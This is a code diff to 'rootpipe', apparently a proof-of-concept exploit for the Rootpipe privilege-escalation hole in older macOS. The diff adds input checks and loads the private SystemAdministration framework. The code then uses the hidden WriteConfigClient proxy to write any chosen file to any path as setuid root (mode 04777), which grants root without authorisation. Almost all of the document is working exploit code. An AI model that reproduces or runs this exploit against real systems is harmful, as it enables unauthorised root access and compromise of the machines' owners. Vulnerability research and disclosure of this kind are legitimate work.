@@ -1,22 +1,32 @@
 #import <Foundation/Foundation.h>
 
-#import <objc/runtime.h>
-
-// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
+#include <objc/runtime.h>
+#include <dlfcn.h>
 
 int main(int argc, const char *argv[])
 {
 	if (argc != 3)
 	{
-		fprintf(stderr, "usage: rootpipe source target\n");
+		fprintf(stderr, "Usage: rootpipe source target\n");
 		
 		return EXIT_FAILURE;
 	}
 	
 	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 	
-	NSData *data = [NSData dataWithContentsOfFile:@(argv[1])];
-	NSString *path = @(argv[2]);
+	BOOL isDir;
+	
+	if (![[NSFileManager defaultManager] fileExistsAtPath:@(argv[1]) isDirectory:&isDir] || isDir)
+	{
+		fprintf(stderr, "Invalid source.\n");
+		
+		return EXIT_FAILURE;
+	}
+	
+	
+	// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
+	
+	dlopen("/System/Library/PrivateFrameworks/SystemAdministration.framework/Versions/A/SystemAdministration", RTLD_LAZY | RTLD_GLOBAL);
 	
 	id client = [objc_lookUpClass("WriteConfigClient") sharedClient];
 	
@@ -24,7 +34,9 @@ int main(int argc, const char *argv[])
 	
 	id tool = [client remoteProxy];
 	
-	[tool createFileWithContents:data path:path attributes:@{ NSFilePosixPermissions: @04777 }];
+	
+	[tool createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
+	
 	
 	[pool drain];
 	
